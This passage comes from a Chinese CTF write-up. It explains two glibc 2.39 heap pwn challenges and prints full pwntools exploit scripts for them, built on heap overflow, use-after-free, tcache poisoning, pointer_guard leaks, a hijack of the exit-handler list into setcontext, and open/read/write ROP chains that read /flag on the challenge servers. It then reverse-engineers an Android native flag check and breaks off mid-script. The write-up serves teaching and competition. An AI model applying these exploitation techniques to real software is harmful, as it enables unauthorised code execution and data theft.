        printf("spark: ");
        read_exact_ish(p, n);
    }
}
```

问题很明显：

- `malloc(sz)` 只允许到 `0x500`

- 但 `read_exact_ish(p, n)` 允许读到 `0x800`

- 没有检查 `n <= sz`

所以这里是一个稳定的 **heap overflow**。

第一次调用 `light()` 时，程序会先分配用户块，再分配 `g_lens`。因此我们可以用用户块溢出覆盖后面的 `g_lens` 结构体。

### **3. 可用原语**

#### **3.1\`lens\_ok\(\)\` 校验**

`g_lens` 想被后续功能接受，必须满足：

```c
magic == 0x706d616c6b726164
seal  == 0x0ddba11c0ffee123
```

把这两个值伪造好以后，后面的 `aim / look / whisper / dream` 就都能用了。

#### **3.2\`look\(\)\` 任意读**

`look()` 会从 `g_lens->focus[g_lens->cursor]` 逐字节读数据并输出，`cursor` 自动加一。

只要我们能控制 `focus`，就有字节级 arbitrary read。

#### **3.3\`aim\(\)\` 改 \`focus\`**

`aim()` 可以把 `g_lens->focus` 指到任意非低地址处，并把 `cursor` 置 0。

这样就能把 `look()` 变成任意地址读，把 `whisper()` 变成任意地址写。

#### **3.4\`whisper\(\)\` 任意写**

`whisper()` 往 `g_lens->focus + cursor` 连续写入数据，只过滤了“像栈”的地址区域。

因为堆和 libc 都不在这个过滤范围里，所以可以稳定改堆块内容、改 `g_lens`、写 fake ucontext、写 ROP 链。

#### **3.5\`dream\(\)\` 最终控制流劫持**

程序退出时：

```c
if ( lens_ok() && g_lens->mood == 0x647265616d6f7277 && g_lens->focus )
{
    if ( g_lens->budget )
        ((void (*)(size_t))g_lens->focus)(g_lens->budget);
}
```

也就是说，只要：

- `magic/seal` 正确

- `mood == 0x647265616d6f7277`

- `focus` 可控

- `budget` 可控

我们就能在退出时执行：

```c
focus(budget)
```

这是整题最后的劫持点。

### **4. 堆布局与第一次利用**

先调用一次：

```python
light(0x100, 0x120, b'A'*0x110 + p64(MAGIC) + p64(SEAL))
```

这时会发生：

1. `malloc(0x100)` 分配用户块

2. `malloc(0x30)` 分配 `g_lens`

3. 用 `0x120` 字节输入溢出到 `g_lens`

这样就能把 `g_lens->magic` 和 `g_lens->seal` 修好。

#### **4.1 堆地址泄露**

`g_lens->focus` 初始指向 `g_ash`，而 `g_ash` 在 `setup()` 中被 `malloc(0x28)` 后又 `free()`，因此这里残留的是 tcache freelist 指针。

连续 `look()` 8 次取出 8 字节，可以拿到安全链接后的堆指针：

```python
heapkey = u64(bytes(look(io) for _ in range(8)))
A = (heapkey << 12) + 0x310
```

在这道题对应的远程环境里，后续关键地址是：

```python
g_lens  = A + 0xd0
g_moon0 = A + 0x100
```

这个偏移是实测出来的

### **5. libc 泄露**

`pray()` 的相位逻辑很关键：

- phase 0：`g_moon[0] = malloc(0x500)`

- phase 1：`g_moon[1] = malloc(0x30)`

- phase 2：`free(g_moon[0])`，若 `lens_ok()` 成功则 `g_lens->focus = g_moon[0]`

如果直接 free `0x500` 块，它通常会先进 tcache。为了让它进 unsorted bin，需要先把 `0x510` 对应的 tcache 填满。

做法：

```python
for _ in range(7):
    light(0x500, 0, b'')
```

然后调用三次 `pray()`：

```python
pray()  # malloc 0x500
pray()  # malloc 0x30
pray()  # free g_moon[0], focus = g_moon[0]
```

这时 `focus` 指向被 free 进 unsorted 的块头，前 8 字节就是 `main_arena` 相关指针。

读 8 字节：

```python
leak = u64(bytes(look(io) for _ in range(8)))
libc = leak - 0x203b20
```

这里对应的远程 libc 是 `Ubuntu 2.39`，`main_arena` 偏移实测为：

```python
main_arena = 0x203b20
```

### **6. ORW 思路**

本题 seccomp 允许 `open/read/write`，所以直接 ORW：

1. `open("/flag", 0, 0)`

2. `read(3, buf, 0x80)`

3. `write(1, buf, 0x80)`

在这个远程环境中，程序启动后只打开了 `stdin/stdout/stderr`，因此 `open("/flag")` 返回的就是 fd `3`，可以直接这么写。

### **7. fake ucontext 布局**

需要自己填的关键字段：

```python
ctx[0x68:0x70] = p64(path_addr)        # rdi = "/flag"
ctx[0x70:0x78] = p64(0)                # rsi = O_RDONLY
ctx[0x88:0x90] = p64(0)                # rdx = mode
ctx[0xa0:0xa8] = p64(stack)            # rsp
ctx[0xa8:0xb0] = p64(libc + OFF_OPEN)  # rip
ctx[0xe0:0xe8] = p64(g_moon0 + 0x1a8)  # fpregs
ctx[0x1c0:0x1c4] = p32(0x1f80)         # mxcsr
```

`setcontext+0x2d` 会先恢复浮点环境，所以 `fpregs` 和 `mxcsr` 不能乱填，否则容易直接崩。

接着把 ROP 链放到：

```python
stack = g_moon0 + 0x3c8
```

链内容是：

```python
open("/flag", 0, 0)
read(3, buf, 0x80)
write(1, buf, 0x80)
```

### exp：

```python
from pwn import *
import re

context.log_level = 'info'

HOST = '114.66.24.210'
PORT = 37466

MAGIC = 0x706d616c6b726164
SEAL  = 0x0ddba11c0ffee123
MOOD  = 0x647265616d6f7277

OFF_SETCTX = 0x4a98d
OFF_OPEN   = 0x11b150
OFF_READ   = 0x11ba80
OFF_WRITE  = 0x11c590
POP_RDI    = 0x10f78b
POP_RSI    = 0x110a7d
SET_RDX_80 = 0x9a4d0


def recv_menu(io):
    io.recvuntil(b'> ')


def cmd(io, c):
    recv_menu(io)
    io.sendline(str(c).encode())


def light(io, sz, n, data=b''):
    cmd(io, 1)
    io.recvuntil(b'oil: ')
    io.sendline(str(sz).encode())
    io.recvuntil(b'flame: ')
    io.sendline(str(n).encode())
    io.recvuntil(b'spark: ')
    if n:
        io.send(data)
    io.recvuntil(b'lit\n')


def look(io):
    cmd(io, 2)
    line = io.recvline().decode()
    return int(re.search(r': ([0-9a-f]{2})$', line).group(1), 16)


def aim(io, addr):
    cmd(io, 3)
    io.recvuntil(b'star: ')
    io.sendline(str(addr).encode())
    io.recvline()


def whisper(io, data):
    cmd(io, 4)
    io.recvuntil(b'words: ')
    io.sendline(str(len(data)).encode())
    io.recvuntil(b'murmur: ')
    io.send(data)
    io.recvuntil(b'heard\n')


def pray(io):
    cmd(io, 5)
    io.recvline()


def exploit():
    io = remote(HOST, PORT)
    io.recvline()

    light(io, 0x100, 0x120, b'A' * 0x110 + p64(MAGIC) + p64(SEAL))

    heapkey = u64(bytes(look(io) for _ in range(8)))
    A = (heapkey << 12) + 0x310
    g_lens = A + 0xd0
    g_moon0 = A + 0x100

    log.info(f'heap base-ish A = {hex(A)}')
    log.info(f'g_lens  = {hex(g_lens)}')
    log.info(f'g_moon0 = {hex(g_moon0)}')

    for _ in range(7):
        light(io, 0x500, 0, b'')

    for _ in range(3):
        pray(io)

    leak = u64(bytes(look(io) for _ in range(8)))
    libc = leak - 0x203b20
    log.info(f'libc = {hex(libc)}')

    path_addr = A
    buf_addr = A + 0x40

    aim(io, A)
    whisper(io, b'/flag\x00'.ljust(0x40, b'\x00') + b'\x00' * 0x80)

    stack = g_moon0 + 0x3c8
    ctx = bytearray(0x500)

    ctx[0x68:0x70] = p64(path_addr)
    ctx[0x70:0x78] = p64(0)
    ctx[0x88:0x90] = p64(0)
    ctx[0xa0:0xa8] = p64(stack)
    ctx[0xa8:0xb0] = p64(libc + OFF_OPEN)
    ctx[0xe0:0xe8] = p64(g_moon0 + 0x1a8)
    ctx[0x1c0:0x1c4] = p32(0x1f80)

    chain = [
        libc + POP_RDI, 3,
        libc + POP_RSI, buf_addr,
        libc + SET_RDX_80, 0, 0, 0,
        libc + OFF_READ,
        libc + POP_RDI, 1,
        libc + POP_RSI, buf_addr,
        libc + SET_RDX_80, 0, 0, 0,
        libc + OFF_WRITE,
    ]

    for i, q in enumerate(chain):
        ctx[0x3c8 + i * 8:0x3d0 + i * 8] = p64(q)

    aim(io, g_moon0)
    whisper(io, bytes(ctx))

    aim(io, g_lens)
    whisper(io, flat([
        MAGIC,
        SEAL,
        libc + OFF_SETCTX,
        0,
        g_moon0,
        MOOD,
    ], word_size=64))

    cmd(io, 6)
    io.interactive()


if __name__ == '__main__':
    exploit()
```

![Image](./images/img-047.png)

## 题目名称：applepie

解题人：J4toPos

解题过程

### **程序分析**

程序维护了一个全局数组，元素结构大致如下：

```c
struct slice {
    size_t size;
    char *buf;
};
```

每个槽位保存一块堆块大小和对应指针。核心问题出在删除逻辑：

```c
free(slices[idx].buf);
```

释放后程序**没有把指针清空**，因此形成了典型的 UAF。后续：

- `show` 可以继续读取已释放块

- `edit` 可以继续写入已释放块

其中 `show` 的实现本质上相当于：

```c
write(1, slices[idx].buf, slices[idx].size);
```

这意味着只要数组里的悬空指针还在，就能把 tcache、unsorted bin 中残留的链表内容直接读出来。

### **第一阶段：heap 和 libc 泄露**

#### **1.1 初始布局**

先布置一个稳定的堆布局：

```text
idx0: 0x40
idx1: 0x40
idx2: 0x500
idx3: 0x40
idx4: 0x900
```

对应思路是：

- 小块用于 tcache / safe-linking 泄露与投毒

- `0x500` 大块用于泄露 unsorted bin

- `0x900` 大块作为后续 fake 结构和 ORW 栈的容器

#### **1.2 泄露 heap**

先 `free(idx0)`，然后 `show(idx0)`，得到的是 safe-linking 处理后的链值，可记为 `leak0`。  

再 `free(idx1)`，然后 `show(idx1)`，得到第二个链值 `leak1`。

根据 glibc safe-linking 的关系，可恢复第一个 `0x40` chunk 的 user pointer：

```python
A = leak1 ^ leak0
```

这里的 `A` 就是第一个小块的 user pointer，也是后续计算各个 chunk 固定相对位置的基准。

#### **1.3 泄露 libc**

再 `free(idx2)`，此时 `0x500` 大块会进 unsorted bin。  

`show(idx2)` 时能直接读到 `main_arena + 0x60` 指针，于是：

```python
libc_base = leak2 - 0x203b20
```

到这里，heap 基址和 libc 基址都已经拿到。

### **第二阶段：tcache poisoning 与任意读**

#### **2.1 这题 safe-linking 的关键点**

这题 poison 时要注意：

**写入的是目标 chunk 的 user pointer，而不是 \`target \- 0x10\`。**

例如最初 `0x40` bin 的 poison，位置 key 为：

```python
key = ((A + 0x50) >> 12)
poison = target ^ key
```

此外，由于后面的辅助 chunk 并不是重新从 top chunk 拿，而是继续从前面那块大 chunk 中切出来，所以后续块地址与 `A` 的相对关系是固定的：

```text
第一个 0x60：A + 0xa0
第二个 0x60：A + 0x110
第一个 0x80：A + 0x180
第二个 0x80：A + 0x210
最终新 0x40：A + 0x2f0
```

因此不同 bin 的 safe-linking key 也可以稳定预先算出。

#### **2.2 把 UAF 变成任意读**

利用方式就是经典的 tcache poisoning：

1. 先 free 某个小块

2. 用 `edit` 对这个已释放 chunk 改写 tcache next

3. 让后续 `add` 两次时，第二次分配落到目标地址

4. 再用 `show` 把目标地址的数据读出来

因为程序本身提供了：

- UAF 写：`edit`

- UAF 读：`show`

所以做任意读会非常顺手。

### **第三阶段：继续泄露\`ld\.so\`、\`fs\_base\` 与 \`pointer\_guard\`**

这题最终稳定利用依赖 glibc 的 `pointer_guard`，因此还要再打三段泄露。

#### **3.1 泄露\`ld\.so\` 的 RW 段地址**

先把一个 `0x40` chunk 打到：

```text
libc + 0x2046a0
```

读取这 0x40 数据后，取其中的 `q3`，可得到：

```python
ldrw = *(uint64_t *)(libc + 0x2046a0 + 0x18)
```

这个值就是 `ld-linux` 的 RW 段地址。

#### **3.2 通过\`ld\.so\` 再泄露 \`fs\_base\`**

然后使用 `0x60` chunk 打到：

```text
ldrw + 0x1170
```

这里结构比较稳定，泄露出的第 4 个 qword 满足：

```python
q3 = fs_base + 0xaa0
```

所以：

```python
fs_base = leak_q3 - 0xaa0
```

#### **3.3 读取\`pointer\_guard\`**

最后再用 `0x80` chunk 打到：

```text
fs_base + 0x30
```

首个 qword 就是：

```python
pointer_guard = *(uint64_t *)(fs_base + 0x30)
```

这就是后续伪造退出链与跳转指针时必须用到的保护值。

### **第四阶段：利用 exit list 劫持到\`setcontext\`**

#### **4.1 关键隐藏符号**

通过 debuginfo 可以锁定以下关键偏移：

```text
__exit_funcs = 0x203680
__quick_exit_funcs = 0x203678
initial = 0x204fc0
__new_exitfn_called = 0x204fa0
setcontext = 0x4a960
```

其中最关键的是：

```text
initial = libc + 0x204fc0
```

它对应 `exit_function_list` 的静态头结点，后续直接覆写这个结构即可。

#### **4.2 fake\`initial\` 的构造**

`quit()` 最终会走到 `exit()`，进一步调用 `__run_exit_handlers`。  

对于 `ef_cxa` 类型的回调，其调用形式是：

```c
fn(arg, status);
```

因此可以构造一个假的 `exit_function_list` 节点，让退出处理链直接调用被 `pointer_guard` 处理过的 `setcontext`：

- `next = 0`

- `idx = 1`

- `fns[0].flavor = 4`

- `fns[0].func.cxa.fn = PTR_MANGLE(setcontext, guard)`

- `fns[0].func.cxa.arg = fake_ucontext`

这样程序在退出阶段会直接跳转到 `setcontext`。

### **第五阶段： ORW 链**

最终在 `idx4` 对应的 `0x900` 大 chunk 上布置：

- fake `ucontext`

- fake stack

- 字符串 `"flag"`

- 读入缓冲区 `buf`

然后退出触发 `setcontext`，切换到伪造栈执行 ORW。

最终链为：

```text
openat(AT_FDCWD=-100, "flag", 0x100)
read(3, buf, 0x100)
write(1, buf, 0x100)
exit(0)
```

这里有两个细节：

#### **（1）\`rdx\` 直接在初始上下文中设定**

最终做法是：

- 直接在 fake `ucontext` 初始寄存器里设好 `rdx = 0x100`

- 让 `read` 和 `write` 共用

#### **（2）\`openat\` 的 flags 也复用 \`0x100\`**

因为不再动态修改 `rdx`，所以 `openat` 的 flags 也直接复用 `0x100`。  

这个值对应 `O_NOCTTY`，对普通文件 `flag` 不影响打开。

同时这里默认：

```text
open("flag") -> fd = 3
```

### exp:

```python
from argparse import ArgumentParser

from pwn import context, p32, p64, process, remote, u64

context.arch = "amd64"
context.log_level = "info"
MASK = (1 << 64) - 1


def q(x):
    return p64(x & MASK)


def rol(x, r):
    return ((x << r) | (x >> (64 - r))) & MASK


def ptr_mangle(x, guard):
    return rol((x ^ guard) & MASK, 0x11)


class ApplePie:
    def __init__(self, io):
        self.io = io
        self.sizes = {}

    def recv_menu(self):
        self.io.recvuntil(b"> ")

    def choose(self, n):
        self.recv_menu()
        self.io.sendline(str(n).encode())

    def send_idx(self, idx):
        self.io.recvuntil(b"idx: ")
        self.io.sendline(str(idx).encode())

    def add(self, idx, size):
        self.choose(1)
        self.send_idx(idx)
        self.io.recvuntil(b"size: ")
        self.io.sendline(str(size).encode())
        self.sizes[idx] = size

    def edit(self, idx, data):
        self.choose(2)
        self.send_idx(idx)
        self.io.recvuntil(b"len: ")
        self.io.sendline(str(len(data)).encode())
        self.io.recvuntil(b"data: ")
        self.io.send(data)

    def show(self, idx):
        self.choose(3)
        self.send_idx(idx)
        self.io.recvuntil(b"crumbs: ")
        data = self.io.recvn(self.sizes[idx])
        self.io.recvuntil(b"\n")
        return data

    def delete(self, idx):
        self.choose(5)
        self.send_idx(idx)

    def quit(self):
        self.choose(6)


def do_leaks(app):
    for idx, size in [(0, 0x40), (1, 0x40), (2, 0x500), (3, 0x40), (4, 0x900)]:
        app.add(idx, size)

    app.delete(0)
    leak0 = u64(app.show(0)[:8])

    app.delete(1)
    leak1 = u64(app.show(1)[:8])

    app.delete(2)
    leak2 = u64(app.show(2)[:8])

    a = leak1 ^ leak0
    libc_base = leak2 - 0x203B20
    return a, libc_base


def build_ucontext_stage(libc_base, fake, path_bytes):
    off = {
        "setcontext": 0x4A960,
        "pop_rax": 0xDD237,
        "pop_rdi": 0x10F78B,
        "pop_rsi": 0x110A7D,
        "syscall_ret": 0x98FB6,
    }

    uc = fake
    stack = fake + 0x300
    path = fake + 0x500
    buf = fake + 0x540
    fp = fake + 0x780

    blob = bytearray(b"\x00" * 0x900)

    def wr(addr, data):
        blob[addr - fake : addr - fake + len(data)] = data

    def wq(addr, val):
        wr(addr, q(val))

    # Minimal fpstate / mxcsr so setcontext's fldenv/ldmxcsr succeeds.
    wq(uc + 0xE0, fp)
    wr(uc + 0x1C0, p32(0x1F80))

    wq(uc + 0xA0, stack)
    wq(uc + 0xA8, libc_base + off["pop_rax"])

    # rdx is shared across openat/read/write. 0x100 works as O_NOCTTY for openat.
    wq(uc + 0x68, 0)
    wq(uc + 0x70, 0)
    wq(uc + 0x88, 0x100)
    wq(uc + 0x98, 0)
    wq(uc + 0x28, 0)
    wq(uc + 0x30, 0)
    for reg_off in (0x78, 0x80, 0x48, 0x50, 0x58, 0x60):
        wq(uc + reg_off, 0)

    chain = [
        257,
        libc_base + off["pop_rdi"],
        0xFFFFFFFFFFFFFF9C,
        libc_base + off["pop_rsi"],
        path,
        libc_base + off["syscall_ret"],
        libc_base + off["pop_rax"],
        0,
        libc_base + off["pop_rdi"],
        3,
        libc_base + off["pop_rsi"],
        buf,
        libc_base + off["syscall_ret"],
        libc_base + off["pop_rax"],
        1,
        libc_base + off["pop_rdi"],
        1,
        libc_base + off["pop_rsi"],
        buf,
        libc_base + off["syscall_ret"],
        libc_base + off["pop_rax"],
        60,
        libc_base + off["pop_rdi"],
        0,
        libc_base + off["syscall_ret"],
    ]
    for i, val in enumerate(chain):
        wq(stack + i * 8, val)

    wr(path, path_bytes + b"\x00")
    return bytes(blob), uc, libc_base + off["setcontext"]


def build_exit_setcontext(initial, guard, uc, setcontext_addr):
    blob = bytearray(b"\x00" * 0x40)
    blob[0x00:0x08] = p64(0)
    blob[0x08:0x10] = p64(1)
    blob[0x10:0x18] = p64(4)
    blob[0x18:0x20] = p64(ptr_mangle(setcontext_addr, guard))
    blob[0x20:0x28] = p64(uc)
    blob[0x28:0x30] = p64(0)
    return bytes(blob)


def start_local(binary, ld_path, libdir):
    argv = [ld_path, "--library-path", libdir, binary]
    return process(argv)


def pwn(io, path_text):
    app = ApplePie(io)
    a, libc_base = do_leaks(app)

    app.edit(1, q((libc_base + 0x2046A0) ^ ((a + 0x50) >> 12)))
    app.add(5, 0x40)
    app.add(6, 0x40)
    ldrw = u64(app.show(6)[24:32])

    for idx, size in [(7, 0x60), (8, 0x60), (9, 0x80), (10, 0x80)]:
        app.add(idx, size)

    app.delete(7)
    app.delete(8)
    app.edit(8, q((ldrw + 0x1170) ^ ((a + 0x110) >> 12)))
    app.add(11, 0x60)
    app.add(12, 0x60)
    fs_base = u64(app.show(12)[24:32]) - 0xAA0

    app.delete(9)
    app.delete(10)
    app.edit(10, q((fs_base + 0x30) ^ ((a + 0x210) >> 12)))
    app.add(13, 0x80)
    app.add(14, 0x80)
    pointer_guard = u64(app.show(14)[:8])

    fake = a + 0x600
    stage, uc, setcontext_addr = build_ucontext_stage(libc_base, fake, path_text.encode())
    app.edit(4, stage)

    initial = libc_base + 0x204FC0
    payload = build_exit_setcontext(initial, pointer_guard, uc, setcontext_addr)

    app.add(15, 0x40)
    app.add(12, 0x40)
    app.delete(15)
    app.delete(12)
    app.edit(12, q(initial ^ ((a + 0x2F0) >> 12)))
    app.add(11, 0x40)
    app.add(6, 0x40)
    app.edit(6, payload)

    app.quit()
    return io.recvrepeat(3)


def main():
    parser = ArgumentParser()
    parser.add_argument("--mode", choices=["local", "remote"], default="remote")
    parser.add_argument("--host", default="114.66.24.210")
    parser.add_argument("--port", type=int, default=48935)
    parser.add_argument("--binary", default="/home/jatopos/MCP2/applepie/applepie")
    parser.add_argument("--ld", default="/home/jatopos/MCP2/applepie/libc6_pkg/usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2")
    parser.add_argument("--libdir", default="/home/jatopos/MCP2/applepie/libc6_pkg/usr/lib/x86_64-linux-gnu")
    parser.add_argument("--path", default="flag")
    args = parser.parse_args()

    if args.mode == "local":
        io = start_local(args.binary, args.ld, args.libdir)
    else:
        io = remote(args.host, args.port)

    try:
        out = pwn(io, args.path)
        print(out.decode("latin1", errors="replace"))
    finally:
        io.close()


if __name__ == "__main__":
    main()

```

![Image](./images/img-048.jpg)

# Re

## 题目名称：[彩蛋]Interlinked

解题人：weixiao

解题过程：

Jadx打开apk，定位到mainactivity，看到flag的校验是在native层

![Image](./images/img-049.png)

`liblmao.so` 没有导出 `Java_com_aaron_lmao_challenge_NativeChallengeBridge_checkFlagNative`，而是在 `JNI_OnLoad` 里动态注册。

`JNI_OnLoad` 中有几段 XOR 解密字符串，解出来是：

```python
def decode(arr):
    out = []
    key = 52

    for i in range(0, len(arr), 2):
        out.append(arr[i] ^ (key - 3))

        if i + 1 < len(arr):
            out.append(arr[i + 1] ^ key)

        key += 6

    return bytes(out)

byte_CFE0 = [
    0x52, 0x5B, 0x5A, 0x15, 0x5C, 0x21, 0x31, 0x29,
    0x27, 0x63, 0x23, 0x3F, 0x34, 0x37, 0x74, 0x3D,
    0x09, 0x05, 0x0B, 0x06, 0x08, 0x1E, 0x14, 0x13,
    0x56, 0x32, 0x1E, 0xF6, 0xEC, 0xFE, 0xEE, 0xCD,
    0xF9, 0xF5, 0xFB, 0xF6, 0xF8, 0xCE, 0xC4, 0xC3,
    0xEB, 0xDE, 0xC6, 0xD6, 0xD2, 0xDD
]

byte_D00E = [
    0x52, 0x5C, 0x52, 0x59, 0x56, 0x06, 0x2F, 0x27,
    0x2E, 0x02, 0x2E, 0x26, 0x3C, 0x2E, 0x3E
]

byte_D01D = [
    0x19, 0x78, 0x5D, 0x5B, 0x4B, 0x21, 0x6C, 0x2A,
    0x28, 0x22, 0x28, 0x7D, 0x1A, 0x3A, 0x31, 0x3B,
    0x02, 0x10, 0x5C, 0x26, 0x07, 0x11, 0x05, 0x17,
    0x56, 0x10, 0x1E, 0xEC, 0xE2, 0xA7, 0xD8, 0xFA,
    0xE3, 0xFD, 0xF9, 0xFD, 0xA6, 0x89, 0xF9
]

for name, arr in [
    ("class_name", byte_CFE0),
    ("method_name", byte_D00E),
    ("method_sig", byte_D01D),
]:
    print(name, "=>", decode(arr).decode())
```

```text
com/aaron/lmao/challenge/NativeChallengeBridge
checkFlagNative
(Ljava/lang/Object;Ljava/lang/String;)Z
```

注册到的 native handler 地址为：

```text
sub_23CA0
```

Manifest 里注册了四个 ContentProvider：

![Image](./images/img-050.png)

```text
content://com.aaron.lmao.probe.virtualization/state
content://com.aaron.lmao.probe.hook/state
content://com.aaron.lmao.probe.root/state
content://com.aaron.lmao.probe.environment/state
```

Provider 基类 `d6.smali` 返回四列：

```text
findings
proof
fold
detail
```

每个 Provider 先收集异常项。如果异常列表为空，`findings = 0`，`detail = clean`。`proof` 和 `fold` 由固定种子算出。

assets 里有一个重要文件：

```text
out/assets/detector_snapshot.json
```

内容包含 clean 状态：

```json
{
  "recoveryUuid": "8f9c2d71-6b5a-43e8-a1c4-0d9e7f2b6a12",
  "bridgeSeed": "3c7415a82e609bdf",
  "categories": [
    { "name": "virtualization", "findings": 0, "proof": 17, "fold": 77 },
    { "name": "hook", "findings": 0, "proof": 31, "fold": 142 },
    { "name": "root", "findings": 0, "proof": 159, "fold": 177 },
    { "name": "environment", "findings": 0, "proof": 130, "fold": 70 }
  ]
}
```

这里容易被坑：`recoveryUuid` 不是最终 flag，它少了 native confirmation step。JSON 里也写了：

```text
Native confirmation step intentionally omitted from this snapshot.
```

本地 rooted x86_64 emulator 查询 Provider 时会得到脏环境：

```text
virtualization: findings=0 proof=17  fold=77  detail=clean
hook:           findings=0 proof=31  fold=142 detail=clean
root:           findings=1 proof=159 fold=4   detail=su
environment:    findings=2 proof=130 fold=67  detail=abi | env:path
```

因此直接在当前模拟器里提交 clean UUID 会失败。这不是 flag 错，而是运行环境参与了 native 计算。

解题时不需要真的绕过 root/hook/虚拟化检测，只要把题目给出的 clean snapshot 当作 intended state，静态代入 native 算法即可。

**native 校验逻辑**

`sub_23CA0` 做了几件事：

1. 通过 JNI 查询四个 Provider。

2. 读出每类的 `findings/proof/fold`。

3. `sub_24C60` 做主进程侧二次确认。如果检测不一致，会把桶替换成 fallback。

4. 缓存 16 字节 detector state。

5. 校验输入是否为标准 UUID：长度 36，连字符在 `8,13,18,23`，其余 32 个字符都是 hex。

6. 把输入转成 32 个 nibble，与 native 算出的目标 nibble 比较。

clean snapshot 的四个桶先被编码成 16 字节：

```text
[findings, proof, fold, findings ^ fold] * 4
```

也就是：

```text
00 11 4d 4d
00 1f 8e 8e
00 9f b1 b1
00 82 46 46
```

**前 16 个 nibble**

前半段目标主要来自 `.rodata` 的 `CF60`：

```text
08 0f 09 0c 02 0d 07 01 06 0b 05 0a 04 03 0e 08
```

clean 状态下 SIMD 修正向量为 0，所以前 16 个 nibble 为：

```text
8f9c2d716b5a43e8
```

格式化到 UUID 前半段：

```text
8f9c2d71-6b5a-43e8
```

**后 16 个 nibble**

native 从 `CF40` 解出一段 16 nibble 中间值：

```text
3c7415a82e609bdf
```

这正好对应 snapshot 里的：

```text
bridgeSeed = 3c7415a82e609bdf
```

然后 native 会再和 `CE60` 表逐 nibble 异或：

```text
bridgeSeed = 3 c 7 4 1 5 a 8 2 e 6 0 9 b d f
CE60       = 9 d b 0 1 8 3 6 5 1 4 b f 1 c c
xor        = a 1 c 4 0 d 9 e 7 f 2 b 6 a 1 3
```

所以后 16 个 nibble 是：

```text
a1c40d9e7f2b6a13
```

这解释了为什么 snapshot 的 `...6a12` 提交不对。native 最后一层确认后，最后一位变成了 `3`。

**解题脚本**

```python
#!/usr/bin/env python3
import json
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SO_PATH = ROOT / "out" / "lib" / "x86_64" / "liblmao.so"
SNAPSHOT_PATH = ROOT / "out" / "assets" / "detector_snapshot.json"

def rol8(x, n=1):
    return ((x << n) | (x >> (8 - n))) & 0xFF

def native_hex_nibble(c):
    """Mirror the native ASCII hex-to-nibble path used for CF40 decoding."""
    if ((c - 0x30) & 0xFF) < 10:
        return (c - 0x30) & 0xFF

    lowered = c | 0x20
    if (c - 0x41) & 0xFFFFFFFF >= 0x1A:
        lowered = c
    return (lowered - 0x57) & 0xFF

def uuid_from_nibbles(nibbles):
    raw = "".join("0123456789abcdef"[x & 0xF] for x in nibbles)
    return f"{raw[:8]}-{raw[8:12]}-{raw[12:16]}-{raw[16:20]}-{raw[20:]}"

def clean_rows_from_snapshot(path):
    snapshot = json.loads(path.read_text(encoding="utf-8"))
    rows = []
    for item in snapshot["categories"]:
        rows.append((item["findings"], item["proof"], item["fold"]))
    return snapshot, rows

def derive_cache_bytes(rows):
    # sub_24740 writes [findings, proof, fold], and sub_23CA0 caches
    # the fourth byte as findings ^ fold.
    out = []
    for findings, proof, fold in rows:
        out.append((findings & 0xFF, proof & 0xFF, fold & 0xFF, (findings ^ fold) & 0xFF))
    return out

def derive_second_half(so, cache):
    cf40 = so[0xCF40:0xCF50]
    ce60 = so[0xCE60:0xCE70]

    proof_fold_highs = [cache[0][2], cache[1][2], cache[2][2], cache[3][2]]
    tmp = []
    key = 0x4A
    for i, byte in enumerate(cf40):
        decoded = byte ^ key
        nibble = native_hex_nibble(decoded)
        group = i >> 2
        salt = ((0x10E0D >> (8 * group)) & 0xFF) if group < 3 else 6
        tmp.append((nibble + (proof_fold_highs[group] ^ salt)) & 0xF)
        key = (key + 7) & 0xFF

    return [(a ^ b) & 0xF for a, b in zip(tmp, ce60)]

def derive_first_half(so, cache):
    cf60 = list(so[0xCF60:0xCF70])
    cea0 = list(so[0xCEA0:0xCEB0])
    ce90 = list(so[0xCE90:0xCEA0])
    cfb0 = list(so[0xCFB0:0xCFC0])

    c0, c1, c2, c3 = cache
    cl, r14b, bpl, byte73533 = c0
    dl, bl, r15b, dword73534_3 = c1
    r8b, r12b, r13b, _byte7353b = c2
    dil, r9b, sil, _byte7353f = c3
    orig_cl, orig_r14b, orig_bpl, orig_byte73533 = c0
    orig_dl, orig_bl, orig_r15b, orig_dword73534_3 = c1

    # This is the byte-wise chain at 0x242e5..0x243b0.
    al = rol8(((cl + 0x3C) & 0xFF) ^ 0xE3)
    al = (al + 0x12) & 0xFF

    r14b = rol8(((r14b + 0x45) & 0xFF) ^ al)
    r14b = (r14b + 0x13) & 0xFF

    bpl = rol8(((bpl + 0x4E) & 0xFF) ^ r14b)
    bpl = (bpl + 0x14) & 0xFF
    bpl = rol8(bpl ^ 0x58)
    bpl = (bpl + 0x15) & 0xFF

    al = rol8(((dl + 0x60) & 0xFF) ^ bpl)
    al = (al + 0x16) & 0xFF

    bl = rol8(((bl + 0x69) & 0xFF) ^ al)
    bl = (bl + 0x17) & 0xFF

    r15b = rol8(((r15b + 0x72) & 0xFF) ^ bl)
    r15b = (r15b + 0x18) & 0xFF
    r15b = rol8(r15b ^ 0x7D)
    r15b = (r15b + 0x19) & 0xFF

    r8b = rol8(((r8b + 0x84) & 0xFF) ^ r15b)
    r8b = (r8b + 0x1A) & 0xFF

    r12b = rol8(((r12b + 0x8D) & 0xFF) ^ r8b)
    r12b = (r12b + 0x1B) & 0xFF

    r13b = rol8(((r13b + 0x96) & 0xFF) ^ r12b)
    r13b = (r13b + 0x1C) & 0xFF
    r13b = rol8(r13b ^ 0xA2)
    r13b = (r13b + 0x1D) & 0xFF

    dil = rol8(((dil + 0xA8) & 0xFF) ^ r13b)
    dil = (dil + 0x1E) & 0xFF

    r9b = rol8(((r9b + 0xB1) & 0xFF) ^ dil)
    r9b = (r9b + 0x1F) & 0xFF

    sil = ((sil + 0xBA) & 0xFF) ^ r9b

    v59 = orig_dl & 0x0F
    v60 = (rol8(sil) + 0x20) & 0xFF
    v81 = orig_cl & 0x0F

    # Mirror the SSE block:
    # v69 = insert/pxor chain
    xmm0 = [0] * 16
    xmm0[0] = v59 | 0xD0
    xmm0[1] = (orig_cl ^ v81) & 0xFF

    xmm1 = [orig_dl, orig_bl, orig_r15b, orig_dword73534_3] + [0] * 12
    xmm1[1] = cache[0][1]
    xmm1 = [a ^ b for a, b in zip(xmm1, xmm0)]

    xmm2 = [orig_dword73534_3, v60] + [0] * 14
    xmm2 = [a ^ b for a, b in zip(xmm2, xmm1)]

    xmm1 = cea0[:]
    xmm1[0] = v60
    xmm1 = [a ^ b for a, b in zip(xmm1, xmm2)]

    xmm0 = [orig_bl, orig_byte73533] + [0] * 14
    xmm1 = [a ^ b for a, b in zip(xmm1, xmm0)]

